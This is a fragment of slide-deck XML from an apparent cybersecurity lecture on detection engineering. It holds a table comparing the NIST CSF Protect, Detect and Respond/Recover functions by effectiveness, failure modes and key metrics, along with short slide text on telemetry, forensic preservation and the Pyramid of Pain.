                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>NIST CSF Function</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Protect (PR)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Detect (DE)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Respond (RS) + Recover (RC)</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>When Most Effective</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Against known attack patterns with available controls</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>When prevention controls are bypassed</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>After attacker achieves objectives</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303307">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Primary Failure Mode</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Zero-days, LoTL, credential abuse bypass controls</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Alert fatigue causes missed detections</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Poor playbooks lead to slow, incomplete containment</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="303308">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="1" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Key Metric</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Vulnerability patch time; MFA adoption rate</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Mean Time to Detect (MTTD); true positive rate</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr sz="1000" b="0" i="0">
                          <a:solidFill>
                            <a:srgbClr val="201C1A"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Mean Time to Respond (MTTR); containment scope</a:t>
                      </a:r>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="50000" marR="50000" marT="25000" marB="25000">
                    <a:solidFill>
                      <a:srgbClr val="FBFAF8"/>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19 Review &amp; Detection Engineering</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"Security teams cannot contain what they have not detected. Robust host defense requires continuous telemetry collection, behavioral analysis, and forensic preservation."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19 Review &amp; Detection Engineering (2/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="19_detection_engineering_summary.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Detection engineering in practice: five mutually reinforcing capabilities that together enable an organization to identify, investigate, and respond to host-level compromises.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19 Review &amp; Detection Engineering (3/3)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="280556" y="1330000"/>
            <a:ext cx="10555354" cy="2601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Assume Breach Mindset (Zero Trust)   ·   Windows Security Logs &amp; Sysmon Telemetry   ·   David Bianco's Pyramid of Pain (TTPs)   ·   RFC 3227 Order of Volatility   ·   Registry and Process Auditing</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